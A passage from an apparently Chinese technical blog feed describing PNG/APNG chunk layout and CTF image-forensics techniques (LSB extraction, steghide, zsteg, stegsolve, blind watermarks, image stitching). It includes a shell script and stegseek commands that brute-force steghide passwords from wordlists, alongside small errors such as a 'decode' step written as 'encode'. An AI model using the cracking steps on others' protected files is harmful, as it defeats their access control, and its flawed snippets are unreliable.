使用从LZ77派生的无损数据压缩算法，原则上会使用 <code>zlib.deflate</code>
将每个数据块的内容进行压缩。</p>
<p>按照标准可以把所有数据存储在一个大的 IDAT 块中，也可以分割存储在多个
IDAT
块中，这原本是为了编码解码时可控内存占用量而设计的，但没有考虑到并行解码，也就是说在对每一个
IDAT 块解压前并不会知道到其中包含了多少像素 。</p>
<p>而与此同时，PNG 也支持动图，即 APNG 格式。</p>
<p>APNG（Animated Portable Network Graphics）是一个基于PNG（Portable
Network Graphics）的位图动画格式，扩展方法类似主要用于网页的GIF
89a，仍对传统PNG保留向下兼容。第1帧是标准的单幅PNG图像，因此只支持原版PNG的软件能正常显示第1帧。剩余的动画帧和帧速数据储存在符合原版PNG标准的扩展数据块里。</p>
<p>但目前来说 Chrome 59、Edge 12、Firefox 3、Opera 46 和 Safari 8
可以查看 APNG，但 Google 并不是很推崇 APNG 格式（他们比较推崇 webp
格式）。</p>
<p>我们可以使用 https://products.aspose.app/imaging/zh-hans/image-view
分离 APNG 的每一帧位图。</p>
<h1 id="signature---文件签名">Signature - 文件签名</h1>
<p>PNG Signature 大小为 8 bytes</p>
<p>十六进制描述为 <code>89 50 4E 47 0D 0A 1A 0A</code></p>
<p>文件特征为 <code>‰PNG</code></p>
<h1 id="chunk---数据块">Chunk - 数据块</h1>
<table>
<colgroup>
<col style="width: 30%">
<col style="width: 10%">
<col style="width: 58%">
</colgroup>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Length (长度)</td>
<td>4</td>
<td>指定数据块中数据域的长度，其长度不超过 (<span class="math inline">\(2^{31}－1\)</span>) 字节</td>
</tr>
<tr class="even">
<td>Chunk Type Code (数据块类型码)</td>
<td>4</td>
<td>数据块类型码由 ASCII 字母 (A-Z 和 a-z) 组成</td>
</tr>
<tr class="odd">
<td>Chunk Data (数据块数据)</td>
<td>Length</td>
<td>存储按照 Chunk Type Code 指定的数据</td>
</tr>
<tr class="even">
<td>CRC (循环冗余检测)</td>
<td>4</td>
<td>存储用来检测是否有错误的循环冗余码</td>
</tr>
</tbody>
</table>
<p>PNG 被分为一个个 Chunk，每个 Chunk
有相同的格式，但存放着不同的数据。</p>
<h2 id="png-数据块">PNG 数据块</h2>
<table>
<colgroup>
<col style="width: 14%">
<col style="width: 22%">
<col style="width: 12%">
<col style="width: 10%">
<col style="width: 40%">
</colgroup>
<thead>
<tr class="header">
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>多数据块</strong></th>
<th><strong>可选否</strong></th>
<th><strong>位置限制</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>IHDR</code></td>
<td>文件头数据块</td>
<td>否</td>
<td>否</td>
<td>第一块</td>
</tr>
<tr class="even">
<td><code>cHRM</code></td>
<td>基色和白色点数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>和<code>IDAT</code>之前</td>
</tr>
<tr class="odd">
<td><code>gAMA</code></td>
<td>图像γ数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>和<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>iCCP</code></td>
<td>辅助数据块</td>
<td>是</td>
<td>是</td>
<td>在<code>PLTE</code>之后<code>IDAT</code>之前
(存在则无<code>sRGB</code>)</td>
</tr>
<tr class="odd">
<td><code>sBIT</code></td>
<td>样本有效位数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>和<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>sRGB</code></td>
<td>标准RPG颜色</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>之后<code>IDAT</code>之前
(与<code>iCCP</code>冲突)</td>
</tr>
<tr class="odd">
<td><code>PLTE</code></td>
<td>调色板数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>bKGD</code></td>
<td>背景颜色数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>之后<code>IDAT</code>之前</td>
</tr>
<tr class="odd">
<td><code>hIST</code></td>
<td>图像直方图数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>之后<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>tRNS</code></td>
<td>图像透明数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>PLTE</code>之后<code>IDAT</code>之前</td>
</tr>
<tr class="odd">
<td><code>oFFs</code></td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>pHYs</code></td>
<td>物理像素尺寸数据块</td>
<td>否</td>
<td>是</td>
<td>在<code>IDAT</code>之前</td>
</tr>
<tr class="odd">
<td><code>sCAL</code></td>
<td>(专用公共数据块)</td>
<td>否</td>
<td>是</td>
<td>在<code>IDAT</code>之前</td>
</tr>
<tr class="even">
<td><code>IDAT</code></td>
<td>图像数据块</td>
<td>是</td>
<td>否</td>
<td>与其他<code>IDAT</code>连续</td>
</tr>
<tr class="odd">
<td><code>tIME</code></td>
<td>图像最后修改时间数据块</td>
<td>否</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="even">
<td><code>tEXt</code></td>
<td>文本信息数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="odd">
<td><code>zTXt</code></td>
<td>压缩文本数据块</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="even">
<td><code>fRAc</code></td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="odd">
<td><code>gIFg</code></td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="even">
<td><code>gIFt</code></td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="odd">
<td><code>gIFx</code></td>
<td>(专用公共数据块)</td>
<td>是</td>
<td>是</td>
<td>无限制</td>
</tr>
<tr class="even">
<td><code>IEND</code></td>
<td>图像结束数据</td>
<td>否</td>
<td>否</td>
<td>最后一个数据块</td>
</tr>
</tbody>
</table>
<blockquote>
<p>详情可查询 https://www.w3.org/TR/PNG/</p>
</blockquote>
<h2 id="apng-数据块">APNG 数据块</h2>
<table>
<colgroup>
<col style="width: 22%">
<col style="width: 22%">
<col style="width: 19%">
<col style="width: 16%">
<col style="width: 19%">
</colgroup>
<thead>
<tr class="header">
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>多数据块</strong></th>
<th><strong>可选否</strong></th>
<th><strong>位置限制</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>acTL</code></td>
<td>动画控制块</td>
<td>否</td>
<td>否</td>
<td><code>IHDR</code>之后</td>
</tr>
<tr class="even">
<td><code>fcTL</code></td>
<td>帧控制块</td>
<td>否</td>
<td>否</td>
<td><code>IHDR</code>之后</td>
</tr>
<tr class="odd">
<td><code>fdAT</code></td>
<td>帧数据块</td>
<td>否</td>
<td>否</td>
<td><code>IHDR</code>之后</td>
</tr>
</tbody>
</table>
<blockquote>
<p>详情可查询 https://wiki.mozilla.org/APNG_Specification</p>
</blockquote>
<h2 id="ios-特有的数据块">IOS 特有的数据块</h2>
<table style="width:100%;">
<colgroup>
<col style="width: 20%">
<col style="width: 20%">
<col style="width: 17%">
<col style="width: 14%">
<col style="width: 28%">
</colgroup>
<thead>
<tr class="header">
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>多数据块</strong></th>
<th><strong>可选否</strong></th>
<th><strong>位置限制</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>iDOT</code></td>
<td>并行解析数据块</td>
<td>否</td>
<td>是</td>
<td><code>IHDR</code>之后<code>IDAT</code>之前</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Apple 并未公开</p>
</blockquote>
<h2 id="ihdr">IHDR</h2>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 12%">
<col style="width: 63%">
</colgroup>
<thead>
<tr class="header">
<th><strong>域的名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>Width</code></td>
<td>4</td>
<td>图像宽度，以像素为单位</td>
</tr>
<tr class="even">
<td><code>Height</code></td>
<td>4</td>
<td>图像高度，以像素为单位</td>
</tr>
<tr class="odd">
<td><code>Bit depth</code></td>
<td>1</td>
<td>图像深度，详情查看下表</td>
</tr>
<tr class="even">
<td><code>Color type</code></td>
<td>1</td>
<td>颜色类型，详情查看下表</td>
</tr>
<tr class="odd">
<td><code>Compression method</code></td>
<td>1</td>
<td>压缩方法 (LZ77派生算法，原则上默认为 <code>zlib.deflate</code>)</td>
</tr>
<tr class="even">
<td><code>Filter method</code></td>
<td>1</td>
<td>滤波器方法</td>
</tr>
<tr class="odd">
<td><code>Interlace method</code></td>
<td>1</td>
<td>隔行扫描方法：0则表示非隔行扫描 ；1则表示 Adam7</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th>Color type 值</th>
<th>含义</th>
<th>Bit depth 值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>0</td>
<td>灰度图像</td>
<td>1，2，4，8 或 16</td>
</tr>
<tr class="even">
<td>2</td>
<td>真彩色图像</td>
<td>8 或 16</td>
</tr>
<tr class="odd">
<td>3</td>
<td>索引彩色图像</td>
<td>1，2，4 或 8</td>
</tr>
<tr class="even">
<td>4</td>
<td>带<span class="math inline">\(\alpha\)</span>通道数据的灰度图像</td>
<td>8 或 16</td>
</tr>
<tr class="odd">
<td>6</td>
<td>带<span class="math inline">\(\alpha\)</span>通道数据的真彩色图像</td>
<td>8 或 16</td>
</tr>
</tbody>
</table>
<h2 id="iend">IEND</h2>
<p>一般来说，IEND 数据块的长度总是 0，十六进制描述总是：</p>
<p><code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></p>
<h2 id="idot">iDOT</h2>
<p>这是 Apple 为了 PNG 解码速度而做的一个优化 。苹果为了让 PNG
格式的图片可以并行解码并且兼容原本的 PNG
标准，把图片内容分为<strong>前半</strong>与<strong>后半</strong>两部分，并把像素流分为多个
IDAT 块，然后在 PNG 文件里添加了一个 iDOT
辅助块，其中记录了<strong>前半</strong>与<strong>后半</strong>的分隔位置（<strong>后半</strong>数据相对
iDOT 块的偏移值）和解压后的像素高度，这样用 Apple 的 PNG 编码器编码的
PNG 图片用 Apple 自家的 PNG 解码器解码就可以分为 2
个并行的过程，以此充分利用多核性能，同时这样的 PNG
图片也能被普通解码器解码。</p>
<p>但其存在一个 bug，详情可以查看文章：<a href="/png-idot-note.html">PNG有关iDOT块的笔记</a></p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>png</tag>
      </tags>
  </entry>
  <entry>
    <title>图片取证笔记</title>
    <url>//picture-forensics-note.html</url>
    <content><![CDATA[<h1 id="图片取证">图片取证</h1>
<h2 id="简述">简述</h2>
<p>图片取证主要包括隐写 (Steganography)，拼图，读图等。</p>
<p>同时图片又有多种格式，包括但不限于 GIP, PNG, JPEG 等。</p>
<p>以下的各种图片取证形式不限于单一格式。</p>
<h2 id="gimp">gimp</h2>
<p>gimp
是一款开源图片编辑软件，它有个很特别的功能是从数据中读取图片，这可以导致如果你不了解某个数据是哪种图片类型时，其依旧可以正常显示图片内容（需要将后缀改成
<code>.data</code>）。</p>
<p>但需要注意的是，可能会产生一定的识别错误，比如说宽度识别错误等。</p>
<h2 id="lsb-隐写">LSB 隐写</h2>
<p><code>LSB</code> 的全称为
<code>Least Significant Bit</code>，在二进制数中意为最低有效位。<code>LSB</code>
位于二进制数的最右侧。</p>
<p><code>MSB</code> 的全称为
<code>Most Significant Bit</code>，在二进制数中属于最高有效位。<code>MSB</code>
是最高加权位，若 <code>MSB=1</code> 则表示数据为负值；若
<code>MSB=0</code> 则表示数据为正。</p>
<p>加密流程即将数据转换为二进制后，将数据隐藏在最低有效位中。</p>
<p>简单的解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lsb</span>(<span class="params">im</span>):</span><br><span class="line">    im = np.array(im, dtype = np.uint8).flatten()</span><br><span class="line">    t = im &amp; <span class="number">0x1</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">    <span class="comment"># 返回二进制字符串</span></span><br><span class="line">    <span class="comment"># return &#x27;&#x27;.join(map(str, t.tolist()))</span></span><br></pre></td></tr></table></figure>
<p>同时也可以对不同的通道取值，例如这里对第二低有效位进行 LSB
隐写提取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lsb</span>(<span class="params">im</span>):</span><br><span class="line">    im = np.array(im, dtype = np.uint8).flatten()</span><br><span class="line">    t = im &amp; <span class="number">0x3</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">    <span class="comment"># 返回二进制字符串</span></span><br><span class="line">    <span class="comment"># return &#x27;&#x27;.join(map(str, t.tolist()))</span></span><br></pre></td></tr></table></figure>
<p>或者只对单个颜色信道进行 LSB 隐写提取，例如这里对 R 信道进行 LSB
隐写提取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lsb</span>(<span class="params">im</span>):</span><br><span class="line">    im = np.array(im, dtype = np.uint8)[:, :, <span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(im)</span><br><span class="line">    t = im &amp; <span class="number">0x1</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">    <span class="comment"># 返回二进制字符串</span></span><br><span class="line">    <span class="comment"># return &#x27;&#x27;.join(map(str, t.tolist()))</span></span><br></pre></td></tr></table></figure>
<h2 id="oursecret">oursecret</h2>
<p>oursecret 是一款较老的软件，支持对 jpeg 和 bmp 的隐写。</p>
<p>它可以隐写任何数据在图像中，并且可以完整提取出包含文件名的数据。</p>
<p>需要使用密码进行数据提取和数据加密。</p>
<h2 id="silenteye">silenteye</h2>
<p>Silenteye 是一个利用 lsb
对目标数据进行隐藏的软件（十分的老），图片格式支持 jpeg 和 bmp
格式。</p>
<p>直接拖拽目标文件，点击 <code>Decode</code>
可以解密其中的隐藏数据。</p>
<p>同时可能它会使用 AES 对数据进行加密，需要进行密码的填写。</p>
<figure>
<img src="/picture-forensics-note/silenteye%20encrypted.png" alt="silenteye encrypted">
<figcaption aria-hidden="true">silenteye encrypted</figcaption>
</figure>
<h2 id="steghide">steghide</h2>
<p>可以对常见的图片格式（如
jpg）进行隐写和提取，同时也对部分音频格式支持隐写和提取。</p>
<p>常常使用 <code>steghide info filename.jpg</code>
对目标文件进行检测。</p>
<p>如果想要明文使用密码提取文件隐写数据，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide extract -sf filename -p password</span><br></pre></td></tr></table></figure>
<p>它会将隐写数据输出到文件当中。</p>
<p>如果不知道密码，我们可以使用 shell 脚本对密码进行爆破：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bruteStegHide.sh</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">for line in `cat $2`;do</span><br><span class="line">    steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    if [[ $? -eq 0 ]];then</span><br><span class="line">        echo &#x27;password is: &#x27;$line</span><br><span class="line">        exit</span><br><span class="line">    fi  </span><br><span class="line">done </span><br></pre></td></tr></table></figure>
<p>使用方法为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bruteStegHide.sh test.jpg passwd.txt</span><br></pre></td></tr></table></figure>
<p>如果感觉爆破速度太慢，可以尝试使用 <a href="https://github.com/RickdeJager/stegseek">Stegseek</a>
这个开源软件对 steghide
的密码进行爆破，该软件效率极高，更推荐使用该款软件。</p>
<p>使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek stegofile.jpg [wordlist.txt]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果不填写参数 <code>wordlist.txt</code> 将默认读取
<code>/usr/share/wordlists/rockyou.txt</code></p>
</blockquote>
<p>或者使用爆破种子的方式无密码提取文件（如果无加密的话）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed stegofile.jpg</span><br></pre></td></tr></table></figure>
<p>如果有加密的情况，也可以使用该方式来探测是否存在 steghide 隐写。</p>
<h2 id="stegsolve">stegsolve</h2>
<p>stegsolve.jar 是一款很优秀的 lsb/msb
隐写取证工具，基本上可以让隐写无处遁形。</p>
<p>使用方向键可以查看各个信道所隐藏的数据（以单色图形式显示），但该软件不支持缩放，对于过大的图片，可能无法查看全貌，所以最好养成每个角落都需要注意的习惯。</p>
<p>Analyze 中的 Data Extract
功能可以同时提取多个信道的数据进行查看和保存，但高亮堪忧，并不是很好查看。</p>
<p>Analyze 中的 Stereogram Solver 功能可以将图片偏移叠加。</p>
<p>Analyze 中的 Frame Browser 功能可以将 GIF
图分解为多图层进行查看，优点是比 Ps
的速度要快，缺点是只能看到显示，并不能像 Ps 一样进行微操。</p>
<p>Analyze 中的 Image Combiner
功能可以将两张图片进行叠加查看（以像素异或，像素加减等形式）。</p>
<h2 id="wbstego">wbStego</h2>
<p>一个隐写工具，支持对 BMP 文件的隐写。</p>
<h2 id="zbarimg">zbarimg</h2>
<p>一个好用的 QRCode 自动化识别工具，主要的使用方式是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zbarimg --raw -Sbinary pic.png</span><br></pre></td></tr></table></figure>
<h2 id="zsteg">zsteg</h2>
<p>zsteg 可以快速扫描出 bmp 和 png 等格式中的 lsb、msb
隐写，但可能存在一定的误差，尤其是对于单信道文本隐藏而言，如果有不确定的情况建议使用
stegsolve 进行查看和数据提取。</p>
<p>zsteg 常用的参数有：</p>
<table>
<thead>
<tr class="header">
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-a</code></td>
<td>对所有信道所有可能进行全方面扫描</td>
</tr>
<tr class="even">
<td><code>-E</code></td>
<td>提取特定信道的数据</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>提取出有效数据并显示出来</td>
</tr>
</tbody>
</table>
<blockquote>
<p>可以使用 <code>zsteg -h</code> 获取更多帮助</p>
</blockquote>
<p>通常也可以直接填写特定的信道名称来进行扫描，并不需要填写固定参数，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg fname.png 2b,b,lsb,xy</span><br></pre></td></tr></table></figure>
<p>或者如果想要查看提取出来的有效数据：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsteg fname.png 2b,b,lsb,xy -v</span><br></pre></td></tr></table></figure>
<h2 id="图片像素差异">图片像素差异</h2>
<p>以下是提取差异像素的示例脚本，注意如果差异的像素是
<code>white</code>，需要将 <code>diff</code>
的初始颜色改为其他颜色。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">comparison = <span class="string">&quot;to.png&quot;</span></span><br><span class="line">target = <span class="string">&quot;to_do.png&quot;</span></span><br><span class="line"></span><br><span class="line">comparison = Image.<span class="built_in">open</span>(comparison)</span><br><span class="line">target = Image.<span class="built_in">open</span>(target)</span><br><span class="line">diff = Image.new(comparison.mode ,comparison.size, <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dcomparison = comparison.load()</span><br><span class="line">dtarget = target.load()</span><br><span class="line">ddiff = diff.load()</span><br><span class="line"></span><br><span class="line">width, height = comparison.size</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">if</span> dcomparison[w, h] != dtarget[w, h]:</span><br><span class="line">            ddiff[w, h] = dtarget[w, h]</span><br><span class="line"></span><br><span class="line">diff.save(<span class="string">&quot;diff.png&quot;</span>, comparison.<span class="built_in">format</span>)</span><br></pre></td></tr></table></figure>
<h2 id="信息隐藏">信息隐藏</h2>
<p>有一种可以将信息隐写在图片中的算法，使用<a href="https://stylesuxx.github.io/steganography/">在线解密网站</a>即可</p>
<h2 id="逆字节序">逆字节序</h2>
<p>有些图片可能将字节的十六进制形式逆序，例如 PNG
图片的逆序会出现特征：</p>
<ul>
<li><p>IEND</p>
<p><code>49 45 4E 44 AE 42 60 82</code> →
<code>28 06 24 EA 44 E4 54 94</code></p></li>
<li><p>SIG</p>
<p><code>89 50 4E 47 0D 0A 1A 0A</code> →
<code>A0 A1 A0 D0 74 E4 05 98</code></p></li>
</ul>
<p>明显特征：010Editor 会报错</p>
<p>逆序脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">infile = <span class="string">&#x27;ZmxhZzQK.png&#x27;</span></span><br><span class="line">outfile = <span class="string">&#x27;out.png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(infile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(outfile, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        fout.write(<span class="built_in">bytes</span>.fromhex(fin.read().<span class="built_in">hex</span>()[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<h2 id="盲水印">盲水印</h2>
<p>主要是使用了 <a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a>
项目，使用方法：</p>
<ul>
<li><p>加盲水印</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 bwm.py encode 原图.png 水印图.png 输出.png</span><br></pre></td></tr></table></figure></li>
<li><p>解盲水印</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 bwm.py encode 原图.png 盲水印图.png 输出.png</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>需要注意的是，盲水印项目要求</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opencv-python==<span class="number">4.2</span><span class="number">.0</span><span class="number">.34</span></span><br><span class="line">matplotlib==<span class="number">2.1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>特别注意！！！</p>
<p>程序 python2 和 python3 版本的加解密结果会有所不同，主要原因是
python2 和 python3 random 的算法不同，如果要让 python3 兼容 python2 的
random 算法请加 <code>--oldseed</code> 参数。</p>
<h2 id="图片拼接">图片拼接</h2>
<p>实现对多张图片的拼接，我们可以使用 <code>montage</code> 软件 (Linux
软件)。</p>
<p>因为 <code>montage</code> 软件可以将图像平铺到可自定义的网格中。</p>
<p>更多关于 <code>montage</code> 软件的使用可以查看：<a href="https://imagemagick.org/">https://imagemagick.org/</a></p>
<p><code>montage</code> 软件有以下操作：</p>
<ul>
<li>将图像平铺到网格中，自动调整大于网格单元大小的图像大小：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage &#123;&#123;image1.png&#125;&#125; &#123;&#123;image2.jpg&#125;&#125; &#123;&#123;imageN.png&#125;&#125; montage.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>将图像平铺成网格，从最大的图像自动计算网格单元大小：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage &#123;&#123;image1.png&#125;&#125; &#123;&#123;image2.jpg&#125;&#125; &#123;&#123;imageN.png&#125;&#125; -geometry +0+0 montage.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>在平铺之前设置网格单元大小并调整图像大小以适应它：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage &#123;&#123;image1.png&#125;&#125; &#123;&#123;image2.jpg&#125;&#125; &#123;&#123;imageN.png&#125;&#125; -geometry 640x480+0+0 montage.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>限制网格中的行数和列数，导致输入图像溢出到多个输出蒙太奇：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage &#123;&#123;image1.png&#125;&#125; &#123;&#123;image2.jpg&#125;&#125; &#123;&#123;imageN.png&#125;&#125; -geometry +0+0 -tile 2x3 montage_%d.jpg</span><br></pre></td></tr></table></figure>
<ul>
<li>在平铺之前调整图像大小并裁剪图像以完全填充其网格单元：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage &#123;&#123;image1.png&#125;&#125; &#123;&#123;image2.jpg&#125;&#125; &#123;&#123;imageN.png&#125;&#125; -geometry +0+0 -resize 640x480^ -gravity center -crop 640x480+0+0 montage.jpg</span><br></pre></td></tr></table></figure>
<p>例如我们想要横向拼接 <code>flag-0.png</code>、<code>flag-1.png</code>
等图片，输出文件名为 <code>flag.png</code>，可以使用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage flag*.png -tile x1 -geometry +1+0 flag.png </span><br></pre></td></tr></table></figure>
<p>最终获得间隔 1 个像素，横向拼接的图片：</p>
<figure>
<img src="/picture-forensics-note/montage%20横向拼接.png" alt="montage 横向拼接">
<figcaption aria-hidden="true">montage 横向拼接</figcaption>
</figure>
<p>批量重命名的 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;./images&#x27;</span></span><br><span class="line">path = pathlib.Path(path)</span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> path.iterdir():</span><br><span class="line">    name = filename.name</span><br><span class="line">    os.rename(filename, path + name.zfill(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>使用 Python 脚本拼接图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">ROW = <span class="number">25</span></span><br><span class="line">COL = <span class="number">25</span></span><br><span class="line">out_filename = <span class="string">&quot;123.png&quot;</span></span><br><span class="line"></span><br><span class="line">imgs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROW * COL):</span><br><span class="line">    filename = <span class="string">f&#x27;./Red Coast/<span class="subst">&#123;i&#125;</span>.png&#x27;</span></span><br><span class="line">    imgs.append(Image.<span class="built_in">open</span>(filename))</span><br><span class="line"></span><br><span class="line">SIZE = imgs[<span class="number">0</span>].size</span><br><span class="line">width, height = ROW * SIZE[<span class="number">0</span>], COL * SIZE[<span class="number">1</span>]</span><br><span class="line">new_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">row_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROW):</span><br><span class="line">    col_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(COL):</span><br><span class="line">        new_img.paste(imgs[i * ROW + j], (row_offset, col_offset))</span><br><span class="line">        col_offset += SIZE[<span class="number">1</span>]</span><br><span class="line">    row_offset += SIZE[<span class="number">0</span>]</span><br><span class="line">new_img.save(out_filename)</span><br></pre></td></tr></table></figure>
<p>横向或纵向拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">H_MODE = <span class="string">&quot;H_MODE&quot;</span>       <span class="comment"># 横向拼接</span></span><br><span class="line">V_MODE = <span class="string">&quot;V_MODE&quot;</span>       <span class="comment"># 纵向拼接</span></span><br><span class="line">DIRNAME = (<span class="string">&#x27;./img/output/png/&#x27;</span>)     <span class="comment"># 图片所在目录</span></span><br><span class="line">MODE = H_MODE</span><br><span class="line"></span><br><span class="line">allimgs = []</span><br><span class="line">dirname, childdir, childfile = <span class="built_in">next</span>(os.walk(DIRNAME))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果需要排序为(1,2,...,n)</span></span><br><span class="line"><span class="comment"># childfile = sorted(childfile, key = lambda x: int(x[:-3]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> childfile:</span><br><span class="line">    filename = dirname + <span class="string">&#x27;/&#x27;</span> + i</span><br><span class="line">    allimgs.append(Image.<span class="built_in">open</span>(filename))</span><br><span class="line"></span><br><span class="line">width0, height0 = allimgs[<span class="number">0</span>].size</span><br><span class="line"><span class="keyword">if</span> MODE == V_MODE:</span><br><span class="line">    width = width0</span><br><span class="line">    height = height0 * <span class="built_in">len</span>(allimgs)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    width = width0 * <span class="built_in">len</span>(allimgs)</span><br><span class="line">    height = height0</span><br><span class="line">newimg = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span 